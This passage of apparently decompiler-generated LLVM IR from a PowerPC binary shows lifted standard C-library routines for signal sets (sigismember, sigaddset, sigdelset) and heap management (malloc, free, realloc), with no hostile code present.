  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ae3822 = add i32 %v2_1000ae28, 128
  %v3_1000ae3823 = inttoptr i32 %v2_1000ae3822 to i32*
  store i32 0, i32* %v3_1000ae3823, align 4
  %v0_1000ae3c24 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ae3c25 = add i32 %v0_1000ae3c24, -1
  store i32 %v1_1000ae3c25, i32* %r11.global-to-local, align 4
  %v1_1000ae4026 = mul i32 %v1_1000ae3c25, 4
  %v1_1000ae4427 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ae4428 = add i32 %v1_1000ae4427, %v1_1000ae4026
  store i32 %v2_1000ae4428, i32* %r9.global-to-local, align 4
  %v0_1000ae4829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ae4830 = add i32 %v0_1000ae4829, -1
  store i32 %v1_1000ae4830, i32* %ctr.global-to-local, align 4
  %v2_1000ae4831 = icmp eq i32 %v1_1000ae4830, 0
  br i1 %v2_1000ae4831, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge

dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge: ; preds = %dec_label_pc_1000ae38.lr.ph, %dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge
  %v2_1000ae4432 = phi i32 [ %v2_1000ae44, %dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge ], [ %v2_1000ae4428, %dec_label_pc_1000ae38.lr.ph ]
  %v0_1000ae38.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ae38 = add i32 %v2_1000ae4432, 4
  %v3_1000ae38 = inttoptr i32 %v2_1000ae38 to i32*
  store i32 %v0_1000ae38.pre, i32* %v3_1000ae38, align 4
  %v0_1000ae3c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ae3c = add i32 %v0_1000ae3c, -1
  store i32 %v1_1000ae3c, i32* %r11.global-to-local, align 4
  %v1_1000ae40 = mul i32 %v1_1000ae3c, 4
  %v1_1000ae44 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ae44 = add i32 %v1_1000ae44, %v1_1000ae40
  store i32 %v2_1000ae44, i32* %r9.global-to-local, align 4
  %v0_1000ae48 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ae48 = add i32 %v0_1000ae48, -1
  store i32 %v1_1000ae48, i32* %ctr.global-to-local, align 4
  %v2_1000ae48 = icmp eq i32 %v1_1000ae48, 0
  br i1 %v2_1000ae48, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge

dec_label_pc_1000ae4c:                            ; preds = %dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge, %dec_label_pc_1000ae38.lr.ph
  %v0_1000ae50.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ae4c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000ae4c, i32* @r3, align 4
  store i32 %v0_1000ae50.pre, i32* @r4, align 4
  %v0_1000ae54 = call i32 @__sigaddset()
  %v1_1000ae58 = icmp slt i32 %v0_1000ae54, 0
  br i1 %v1_1000ae58, label %dec_label_pc_1000aea0, label %dec_label_pc_1000ae60

dec_label_pc_1000ae60:                            ; preds = %dec_label_pc_1000ae4c
  %v0_1000ae64 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ae6c = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1002ace0.611 to i32), i32 %v0_1000ae64)
  %v2_1000ae78 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268480144, i32* @lr, align 4
  %v4_1000ae8c = call i32 @__libc_sigaction(i32 %v0_1000ae64, i32* nonnull %stack_var_-296, i32 %v2_1000ae78)
  %v1_1000ae90 = icmp slt i32 %v4_1000ae8c, 0
  br i1 %v1_1000ae90, label %dec_label_pc_1000aea0, label %dec_label_pc_1000ae98

dec_label_pc_1000ae98:                            ; preds = %dec_label_pc_1000ae60
  %v3_1000ae98 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000ae98, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aea4

dec_label_pc_1000aea0:                            ; preds = %dec_label_pc_1000ae60, %dec_label_pc_1000ae4c
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aea4

dec_label_pc_1000aea4:                            ; preds = %dec_label_pc_1000ae98, %dec_label_pc_1000ae08, %dec_label_pc_1000aea0
  %v0_1000aea8 = phi i32 [ %v3_1000ae98, %dec_label_pc_1000ae98 ], [ %v0_1000aea8.pre, %dec_label_pc_1000ae08 ], [ -1, %dec_label_pc_1000aea0 ]
  ret i32 %v0_1000aea8

; uselistorder directives
  uselistorder i32 %v1_1000ae48, { 1, 0 }
  uselistorder i32 %v2_1000ae44, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000aea4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ae38.dec_label_pc_1000ae38_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000aebc = add i32 %arg2, -1
  %v1_1000aec0 = call i32 @__asm_rlwinm(i32 %v1_1000aebc, i32 29, i32 3, i32 29)
  %v1_1000aec4 = urem i32 %v1_1000aebc, 32
  %v2_1000aec8 = add i32 %v1_1000aec0, %arg1
  %v3_1000aec8 = inttoptr i32 %v2_1000aec8 to i32*
  %v4_1000aec8 = load i32, i32* %v3_1000aec8, align 4
  %v3_1000aed0 = shl i32 1, %v1_1000aec4
  %v2_1000aed4 = and i32 %v4_1000aec8, %v3_1000aed0
  %v2_1000aed8 = icmp ne i32 %v2_1000aed4, 0
  %v5_1000aedc = zext i1 %v2_1000aed8 to i32
  ret i32 %v5_1000aedc
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000aee4 = load i32, i32* @r4, align 4
  %v1_1000aee4 = add i32 %v0_1000aee4, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000aeec = call i32 @__asm_rlwinm(i32 %v1_1000aee4, i32 29, i32 3, i32 29)
  %v1_1000aef0 = urem i32 %v1_1000aee4, 32
  %v1_1000aef4 = load i32, i32* @r3, align 4
  %v2_1000aef4 = add i32 %v1_1000aef4, %v1_1000aeec
  %v3_1000aef4 = inttoptr i32 %v2_1000aef4 to i32*
  %v4_1000aef4 = load i32, i32* %v3_1000aef4, align 4
  %v0_1000aef8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000aef8 = shl i32 %v0_1000aef8, %v1_1000aef0
  store i32 %v3_1000aef8, i32* %r0.global-to-local, align 4
  %v2_1000aefc = or i32 %v3_1000aef8, %v4_1000aef4
  store i32 %v2_1000aefc, i32* %v3_1000aef4, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000af0c = add i32 %arg2, -1
  %v1_1000af14 = call i32 @__asm_rlwinm(i32 %v1_1000af0c, i32 29, i32 3, i32 29)
  %v1_1000af18 = urem i32 %v1_1000af0c, 32
  %v2_1000af1c = add i32 %v1_1000af14, %arg1
  %v3_1000af1c = inttoptr i32 %v2_1000af1c to i32*
  %v4_1000af1c = load i32, i32* %v3_1000af1c, align 4
  %v3_1000af20 = shl i32 -2, %v1_1000af18
  %v4_1000af20 = sub nsw i32 32, %v1_1000af18
  %v5_1000af20 = lshr i32 -2, %v4_1000af20
  %v6_1000af20 = or i32 %v5_1000af20, %v3_1000af20
  %v2_1000af24 = and i32 %v6_1000af20, %v4_1000af1c
  store i32 %v2_1000af24, i32* %v3_1000af1c, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000af34 = load i32, i32* @r3, align 4
  %v3_1000af34 = icmp eq i32 %v0_1000af34, 0
  br i1 %v3_1000af34, label %dec_label_pc_1000af4c, label %dec_label_pc_1000af50

dec_label_pc_1000af4c:                            ; preds = %entry
  br label %dec_label_pc_1000af50

dec_label_pc_1000af50:                            ; preds = %entry, %dec_label_pc_1000af4c
  %v0_1000af60 = phi i32 [ 1, %dec_label_pc_1000af4c ], [ %v0_1000af34, %entry ]
  %v3_1000af54 = icmp ugt i32 %v0_1000af60, -8
  br i1 %v3_1000af54, label %dec_label_pc_1000b064, label %dec_label_pc_1000af5c

dec_label_pc_1000af5c:                            ; preds = %dec_label_pc_1000af50
  %v1_1000af60 = add i32 %v0_1000af60, 4
  store i32 ptrtoint (i32* @global_var_1002acb0.612 to i32), i32* @r29, align 4
  store i32 %v1_1000af60, i32* %stack_var_-40, align 4
  %v0_1000af70 = call i32 @__pthread_return_0()
  %v2_1000af78 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000af80 = call i32 @__heap_alloc(i32* inttoptr (i32 268585488 to i32*), i32 %v2_1000af78)
  store i32 %v3_1000af80, i32* %r31.global-to-local, align 4
  %v0_1000af8c = call i32 @__pthread_return_0()
  %v3_1000af90 = icmp eq i32 %v3_1000af80, 0
  br i1 %v3_1000af90, label %dec_label_pc_1000af98, label %dec_label_pc_1000b048.thread

dec_label_pc_1000b048.thread:                     ; preds = %dec_label_pc_1000af5c
  br label %dec_label_pc_1000b05c

dec_label_pc_1000af98:                            ; preds = %dec_label_pc_1000af5c
  %v3_1000af9c = load i32, i32* @global_var_10024a70.553, align 4
  store i32 %v3_1000af9c, i32* %r31.global-to-local, align 4
  %v3_1000afa0 = load i32, i32* %stack_var_-40, align 4
  %v2_1000afa4 = icmp ult i32 %v3_1000afa0, %v3_1000af9c
  br i1 %v2_1000afa4, label %dec_label_pc_1000afbc, label %dec_label_pc_1000afac

dec_label_pc_1000afac:                            ; preds = %dec_label_pc_1000af98
  %v1_1000afb0 = sub i32 0, %v3_1000af9c
  %v2_1000afac = add i32 %v3_1000af9c, -1
  %v1_1000afb4 = add i32 %v2_1000afac, %v3_1000afa0
  %v2_1000afb8 = and i32 %v1_1000afb4, %v1_1000afb0
  store i32 %v2_1000afb8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000afbc

dec_label_pc_1000afbc:                            ; preds = %dec_label_pc_1000af98, %dec_label_pc_1000afac
  %v0_1000afc8 = call i32 @__pthread_return_0()
  %v0_1000afcc = load i32, i32* %r31.global-to-local, align 4
  store i32 268480468, i32* @lr, align 4
  %v1_1000afd0 = call i32 @__GI_sbrk(i32 %v0_1000afcc)
  %v3_1000afd4 = icmp eq i32 %v1_1000afd0, -1
  br i1 %v3_1000afd4, label %dec_label_pc_1000aff4, label %dec_label_pc_1000afdc

dec_label_pc_1000afdc:                            ; preds = %dec_label_pc_1000afbc
  %v1_1000afdc = add i32 %v1_1000afd0, 3
  %v1_1000afe0 = call i32 @__asm_rlwinm(i32 %v1_1000afdc, i32 0, i32 0, i32 29)
  store i32 %v1_1000afe0, i32* @r30, align 4
  %v4_1000afe4 = icmp eq i32 %v1_1000afe0, %v1_1000afd0
  br i1 %v4_1000afe4, label %dec_label_pc_1000aff4, label %dec_label_pc_1000afec

dec_label_pc_1000afec:                            ; preds = %dec_label_pc_1000afdc
  %v2_1000afec = sub i32 %v1_1000afe0, %v1_1000afd0
  store i32 268480500, i32* @lr, align 4
  %v1_1000aff0 = call i32 @__GI_sbrk(i32 %v2_1000afec)
  br label %dec_label_pc_1000aff4

dec_label_pc_1000aff4:                            ; preds = %dec_label_pc_1000afdc, %dec_label_pc_1000afbc, %dec_label_pc_1000afec
  %v0_1000affc = call i32 @__pthread_return_0()
  %v0_1000b000 = load i32, i32* @r30, align 4
  %v3_1000b000 = icmp eq i32 %v0_1000b000, -1
  br i1 %v3_1000b000, label %dec_label_pc_1000b064, label %dec_label_pc_1000b048

dec_label_pc_1000b048:                            ; preds = %dec_label_pc_1000aff4
  store i32 ptrtoint (i32* @global_var_1002acb0.612 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10024a10 to i32), i32* @r29, align 4
  %v0_1000b01c = call i32 @__pthread_return_0()
  %v0_1000b020 = load i32, i32* @r31, align 4
  %v0_1000b024 = load i32, i32* @r30, align 4
  %v0_1000b028 = load i32, i32* @r29, align 4
  store i32 268480560, i32* @lr, align 4
  %v3_1000b02c = inttoptr i32 %v0_1000b028 to i32*
  %v4_1000b02c = call i32 @__heap_free(i32* %v3_1000b02c, i32 %v0_1000b024, i32 %v0_1000b020)
  %v0_1000b030 = load i32, i32* @r29, align 4
  %v2_1000b038 = inttoptr i32 %v0_1000b030 to i32*
  %v3_1000b038 = call i32 @__heap_alloc(i32* %v2_1000b038, i32 %v2_1000af78)
  store i32 %v3_1000b038, i32* %r31.global-to-local, align 4
  %v0_1000b044 = call i32 @__pthread_return_0()
  %v3_1000b048 = icmp eq i32 %v3_1000b038, 0
  br i1 %v3_1000b048, label %dec_label_pc_1000b05c.thread, label %dec_label_pc_1000b05c

dec_label_pc_1000b05c.thread:                     ; preds = %dec_label_pc_1000b048
  br label %dec_label_pc_1000b064

dec_label_pc_1000b05c:                            ; preds = %dec_label_pc_1000b048, %dec_label_pc_1000b048.thread
  %v0_1000b05c.pr6 = phi i32 [ %v3_1000af80, %dec_label_pc_1000b048.thread ], [ %v3_1000b038, %dec_label_pc_1000b048 ]
  %v3_1000b050 = load i32, i32* %stack_var_-40, align 4
  %v2_1000b054 = inttoptr i32 %v0_1000b05c.pr6 to i32*
  store i32 %v3_1000b050, i32* %v2_1000b054, align 4
  %v0_1000b058 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b058 = add i32 %v0_1000b058, 4
  store i32 %v1_1000b058, i32* @r31, align 4
  %v3_1000b05c = icmp eq i32 %v1_1000b058, 0
  br i1 %v3_1000b05c, label %dec_label_pc_1000b064, label %dec_label_pc_1000b074

dec_label_pc_1000b064:                            ; preds = %dec_label_pc_1000b05c.thread, %dec_label_pc_1000b05c, %dec_label_pc_1000aff4, %dec_label_pc_1000af50
  %v0_1000b064 = call i32 @__errno_location()
  %v2_1000b06c = inttoptr i32 %v0_1000b064 to i32*
  store i32 12, i32* %v2_1000b06c, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000b074

dec_label_pc_1000b074:                            ; preds = %dec_label_pc_1000b05c, %dec_label_pc_1000b064
  %v0_1000b078 = phi i32 [ %v1_1000b058, %dec_label_pc_1000b05c ], [ 0, %dec_label_pc_1000b064 ]
  ret i32 %v0_1000b078

; uselistorder directives
  uselistorder i32 %v1_1000b058, { 1, 0, 2 }
  uselistorder i32 %v1_1000afe0, { 1, 0, 2 }
  uselistorder i32 %v1_1000afd0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000af9c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000af80, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000b074, { 1, 0 }
  uselistorder label %dec_label_pc_1000b064, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000aff4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000afbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000af50, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000b08c = load i32, i32* @r3, align 4
  %v3_1000b08c = icmp eq i32 %v0_1000b08c, 0
  br i1 %v3_1000b08c, label %dec_label_pc_1000b178, label %dec_label_pc_1000b0a4

dec_label_pc_1000b0a4:                            ; preds = %entry
  %v1_1000b0a8 = add i32 %v0_1000b08c, -4
  %v2_1000b0a8 = inttoptr i32 %v1_1000b0a8 to i32*
  %v3_1000b0a8 = load i32, i32* %v2_1000b0a8, align 4
  store i32 %v3_1000b0a8, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_1000b0bc = call i32 @__pthread_return_0()
  %v0_1000b0c4 = load i32, i32* @r28, align 4
  store i32 268480720, i32* @lr, align 4
  %v4_1000b0cc = call i32 @__heap_free(i32* nonnull @global_var_10024a10, i32 %v1_1000b0a8, i32 %v0_1000b0c4)
  %v3_1000b0d4 = load i32, i32* @global_var_10024a70.553, align 4
  store i32 %v4_1000b0cc, i32* @r29, align 4
  %v1_1000b0dc = inttoptr i32 %v4_1000b0cc to i32*
  %v2_1000b0dc = load i32, i32* %v1_1000b0dc, align 4
  store i32 %v2_1000b0dc, i32* @r27, align 4
  %v1_1000b0e0 = mul i32 %v3_1000b0d4, 8
  %v2_1000b0e4 = icmp ult i32 %v2_1000b0dc, %v1_1000b0e0
  br i1 %v2_1000b0e4, label %dec_label_pc_1000b118, label %dec_label_pc_1000b0ec

dec_label_pc_1000b0ec:                            ; preds = %dec_label_pc_1000b0a4
  store i32 ptrtoint (i32* @global_var_1002ad60.615 to i32), i32* @r28, align 4
  %v0_1000b0fc = call i32 @__pthread_return_0()
  store i32 268480776, i32* @lr, align 4
  %v1_1000b104 = call i32 @__GI_sbrk(i32 0)
  %v0_1000b108 = load i32, i32* @r31, align 4
  %v4_1000b108 = icmp eq i32 %v0_1000b108, %v1_1000b104
  br i1 %v4_1000b108, label %dec_label_pc_1000b120, label %dec_label_pc_1000b110

dec_label_pc_1000b110:                            ; preds = %dec_label_pc_1000b0ec
  %v0_1000b114 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000b118

dec_label_pc_1000b118:                            ; preds = %dec_label_pc_1000b0a4, %dec_label_pc_1000b110
  br label %dec_label_pc_1000b174

dec_label_pc_1000b120:                            ; preds = %dec_label_pc_1000b0ec
  %v0_1000b120 = load i32, i32* @r29, align 4
  %v1_1000b120 = add i32 %v0_1000b120, 4
  %v2_1000b120 = inttoptr i32 %v1_1000b120 to i32*
  %v3_1000b120 = load i32, i32* %v2_1000b120, align 4
  %v3_1000b124 = icmp eq i32 %v3_1000b120, 0
  br i1 %v3_1000b124, label %dec_label_pc_1000b134, label %dec_label_pc_1000b12c

dec_label_pc_1000b12c:                            ; preds = %dec_label_pc_1000b120
  %v1_1000b12c = add i32 %v0_1000b120, 8
  %v2_1000b12c = inttoptr i32 %v1_1000b12c to i32*
  %v3_1000b12c = load i32, i32* %v2_1000b12c, align 4
  %v2_1000b130 = add i32 %v3_1000b120, 8
  %v3_1000b130 = inttoptr i32 %v2_1000b130 to i32*
  store i32 %v3_1000b12c, i32* %v3_1000b130, align 4
  %v0_1000b134.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b134

dec_label_pc_1000b134:                            ; preds = %dec_label_pc_1000b120, %dec_label_pc_1000b12c
  %v0_1000b134 = phi i32 [ %v0_1000b120, %dec_label_pc_1000b120 ], [ %v0_1000b134.pre, %dec_label_pc_1000b12c ]
  %v1_1000b134 = add i32 %v0_1000b134, 8
  %v2_1000b134 = inttoptr i32 %v1_1000b134 to i32*
  %v3_1000b134 = load i32, i32* %v2_1000b134, align 4
  %v1_1000b138 = add i32 %v0_1000b134, 4
  %v2_1000b138 = inttoptr i32 %v1_1000b138 to i32*
  %v3_1000b138 = load i32, i32* %v2_1000b138, align 4
  %v3_1000b13c = icmp eq i32 %v3_1000b134, 0
  br i1 %v3_1000b13c, label %dec_label_pc_1000b14c, label %dec_label_pc_1000b144

dec_label_pc_1000b144:                            ; preds = %dec_label_pc_1000b134
  %v2_1000b144 = add i32 %v3_1000b134, 4
  %v3_1000b144 = inttoptr i32 %v2_1000b144 to i32*
  store i32 %v3_1000b138, i32* %v3_1000b144, align 4
  br label %dec_label_pc_1000b150

dec_label_pc_1000b14c:                            ; preds = %dec_label_pc_1000b134
  store i32 %v3_1000b138, i32* @global_var_10024a10, align 4
  br label %dec_label_pc_1000b150

dec_label_pc_1000b150:                            ; preds = %dec_label_pc_1000b144, %dec_label_pc_1000b14c
  %v0_1000b158 = call i32 @__pthread_return_0()
  %v0_1000b15c = load i32, i32* @r27, align 4
  %v1_1000b15c = load i32, i32* @r29, align 4
  %v0_1000b164 = load i32, i32* @r31, align 4
  %v2_1000b15c = sub i32 12, %v0_1000b15c
  %v1_1000b160 = add i32 %v2_1000b15c, %v1_1000b15c
  %v2_1000b164 = sub i32 %v1_1000b160, %v0_1000b164
  store i32 268480876, i32* @lr, align 4
  %v1_1000b168 = call i32 @__GI_sbrk(i32 %v2_1000b164)
  br label %dec_label_pc_1000b174

dec_label_pc_1000b174:                            ; preds = %dec_label_pc_1000b118, %dec_label_pc_1000b150
  %v0_1000b174 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000b178

dec_label_pc_1000b178:                            ; preds = %entry, %dec_label_pc_1000b174
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000b174, %dec_label_pc_1000b174 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000b134, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b178, { 1, 0 }
  uselistorder label %dec_label_pc_1000b174, { 1, 0 }
  uselistorder label %dec_label_pc_1000b150, { 1, 0 }
  uselistorder label %dec_label_pc_1000b134, { 1, 0 }
  uselistorder label %dec_label_pc_1000b118, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000b18c = load i32, i32* @r4, align 4
  %v3_1000b18c = icmp eq i32 %v0_1000b18c, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000b18c, label %dec_label_pc_1000b1a8, label %dec_label_pc_1000b1b4

dec_label_pc_1000b1a8:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000b1ac.618 to i32), i32* @lr, align 4
  %v0_1000b1a8 = call i32 @free()
  br label %dec_label_pc_1000b1c0

dec_label_pc_1000b1b4:                            ; preds = %entry
  %v3_1000b1b4 = icmp eq i32 %arg1, 0
  br i1 %v3_1000b1b4, label %dec_label_pc_1000b1c0, label %dec_label_pc_1000b1cc

dec_label_pc_1000b1c0:                            ; preds = %dec_label_pc_1000b1b4, %dec_label_pc_1000b1a8
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b1a8 ], [ %v0_1000b18c, %dec_label_pc_1000b1b4 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268480964, i32* @lr, align 4
  %v0_1000b1c0 = call i32 @malloc()
  store i32 %v0_1000b1c0, i32* @r28, align 4
  br label %dec_label_pc_1000b2a4

dec_label_pc_1000b1cc:                            ; preds = %dec_label_pc_1000b1b4
  %v1_1000b1cc = add i32 %v0_1000b18c, 7
  %v1_1000b1d0 = add i32 %arg1, -4
  store i32 %v1_1000b1d0, i32* %r27.global-to-local, align 4
  %v1_1000b1d4 = call i32 @__asm_rlwinm(i32 %v1_1000b1cc, i32 0, i32 0, i32 29)
  store i32 %v1_1000b1d4, i32* %r31.global-to-local, align 4
  %v2_1000b1d8 = inttoptr i32 %v1_1000b1d0 to i32*
  %v3_1000b1d8 = load i32, i32* %v2_1000b1d8, align 4
  store i32 %v3_1000b1d8, i32* @r30, align 4
  %v2_1000b1dc = icmp ugt i32 %v1_1000b1d4, 11
  br i1 %v2_1000b1dc, label %dec_label_pc_1000b1e8, label %dec_label_pc_1000b1e4

dec_label_pc_1000b1e4:                            ; preds = %dec_label_pc_1000b1cc
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b1e8

dec_label_pc_1000b1e8:                            ; preds = %dec_label_pc_1000b1cc, %dec_label_pc_1000b1e4
  %v0_1000b268 = phi i32 [ %v1_1000b1d4, %dec_label_pc_1000b1cc ], [ 12, %dec_label_pc_1000b1e4 ]
  %v3_1000b1e8 = icmp ugt i32 %v0_1000b268, %v3_1000b1d8
  br i1 %v3_1000b1e8, label %dec_label_pc_1000b1f0, label %dec_label_pc_1000b268

dec_label_pc_1000b1f0:                            ; preds = %dec_label_pc_1000b1e8
  store i32 ptrtoint (i32* @global_var_1002acb0.612 to i32), i32* @r29, align 4
  %v0_1000b1fc = call i32 @__pthread_return_0()
  %v0_1000b204 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000b204 = load i32, i32* @r30, align 4
  %v2_1000b204 = add i32 %v1_1000b204, %v0_1000b204
  %v1_1000b208 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b208 = sub i32 %v1_1000b208, %v1_1000b204
  %v4_1000b210 = call i32 @__heap_alloc_at(i32* nonnull @global_var_10024a10, i32 %v2_1000b204, i32 %v2_1000b208)
  store i32 %v4_1000b210, i32* %r27.global-to-local, align 4
  %v0_1000b21c = call i32 @__pthread_return_0()
  %v3_1000b220 = icmp eq i32 %v4_1000b210, 0
  br i1 %v3_1000b220, label %dec_label_pc_1000b234, label %dec_label_pc_1000b228

dec_label_pc_1000b228:                            ; preds = %dec_label_pc_1000b1f0
  %v0_1000b228 = load i32, i32* @r30, align 4
  %v2_1000b228 = add i32 %v0_1000b228, %v4_1000b210
  %v1_1000b22c = load i32, i32* @r28, align 4
  %v2_1000b22c = add i32 %v1_1000b22c, -4
  %v3_1000b22c = inttoptr i32 %v2_1000b22c to i32*
  store i32 %v2_1000b228, i32* %v3_1000b22c, align 4
  br label %dec_label_pc_1000b2a4

dec_label_pc_1000b234:                            ; preds = %dec_label_pc_1000b1f0
  %v0_1000b234 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b234 = add i32 %v0_1000b234, -4
  store i32 %v1_1000b234, i32* @r3, align 4
  store i32 268481084, i32* @lr, align 4
  %v0_1000b238 = call i32 @malloc()
  store i32 %v0_1000b238, i32* @r3, align 4
  store i32 %v0_1000b238, i32* @r31, align 4
  %v3_1000b23c = icmp eq i32 %v0_1000b238, 0
  br i1 %v3_1000b23c, label %dec_label_pc_1000b244, label %dec_label_pc_1000b24c

dec_label_pc_1000b244:                            ; preds = %dec_label_pc_1000b234
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000b2a4

dec_label_pc_1000b24c:                            ; preds = %dec_label_pc_1000b234
  %v0_1000b24c = load i32, i32* @r28, align 4
  store i32 %v0_1000b24c, i32* @r4, align 4
  %v0_1000b250 = load i32, i32* @r30, align 4
  %v1_1000b250 = add i32 %v0_1000b250, -4
  store i32 %v1_1000b250, i32* @r5, align 4
  store i32 268481112, i32* @lr, align 4
  %v0_1000b254 = call i32 @memcpy()
  %v0_1000b258 = load i32, i32* @r28, align 4
  store i32 %v0_1000b258, i32* @r3, align 4
  store i32 268481120, i32* @lr, align 4
  %v0_1000b25c = call i32 @free()
  %v0_1000b260 = load i32, i32* @r31, align 4
  store i32 %v0_1000b260, i32* @r28, align 4
  br label %dec_label_pc_1000b2a4

dec_label_pc_1000b268:                            ; preds = %dec_label_pc_1000b1e8
  %v1_1000b268 = add i32 %v0_1000b268, 28
  %v3_1000b26c = icmp ugt i32 %v1_1000b268, %v3_1000b1d8
  br i1 %v3_1000b26c, label %dec_label_pc_1000b2a4, label %dec_label_pc_1000b274

dec_label_pc_1000b274:                            ; preds = %dec_label_pc_1000b268
  store i32 ptrtoint (i32* @global_var_1002acb0.612 to i32), i32* @r29, align 4
  %v0_1000b280 = call i32 @__pthread_return_0()
  %v0_1000b288 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000b288 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b288 = add i32 %v1_1000b288, %v0_1000b288
  %v1_1000b28c = load i32, i32* @r30, align 4
  %v2_1000b28c = sub i32 %v1_1000b28c, %v1_1000b288
  store i32 268481176, i32* @lr, align 4
  %v4_1000b294 = call i32 @__heap_free(i32* nonnull @global_var_10024a10, i32 %v2_1000b288, i32 %v2_1000b28c)
  %v0_1000b29c = call i32 @__pthread_return_0()
  %v0_1000b2a0 = load i32, i32* @r31, align 4
  %v1_1000b2a0 = load i32, i32* @r28, align 4
  %v2_1000b2a0 = add i32 %v1_1000b2a0, -4
  %v3_1000b2a0 = inttoptr i32 %v2_1000b2a0 to i32*
  store i32 %v0_1000b2a0, i32* %v3_1000b2a0, align 4
  br label %dec_label_pc_1000b2a4

dec_label_pc_1000b2a4:                            ; preds = %dec_label_pc_1000b268, %dec_label_pc_1000b24c, %dec_label_pc_1000b244, %dec_label_pc_1000b228, %dec_label_pc_1000b1c0, %dec_label_pc_1000b274
  %v0_1000b2a8 = load i32, i32* @r28, align 4
  ret i32 %v0_1000b2a8

; uselistorder directives
  uselistorder i32 %v1_1000b288, { 1, 0 }
  uselistorder i32 %v4_1000b210, { 1, 0, 2 }
  uselistorder i32 %v1_1000b204, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_10024a10, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000b2a4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000b1e8, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
